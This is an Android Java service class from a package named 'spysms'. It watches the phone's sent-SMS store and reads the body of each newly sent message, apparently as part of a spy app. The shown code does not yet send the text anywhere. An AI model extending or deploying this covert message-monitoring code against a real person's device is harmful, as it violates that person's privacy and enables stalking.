package spy.gra.com.spysms.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;

/**
 * Service that is alive as long as the kernel wants to
 */
public class SmsService extends Service {

    private ContentResolver contentResolver;
    private Uri uri = Uri.parse("content://sms/sent");
    private Handler handler;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(uri, true, new contentObserver(handler));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public class contentObserver extends ContentObserver {
        public contentObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            cursor.moveToFirst();
            String content = cursor.getString(cursor.getColumnIndex("body"));
            super.onChange(selfChange);
            cursor.close();
        }
    }
}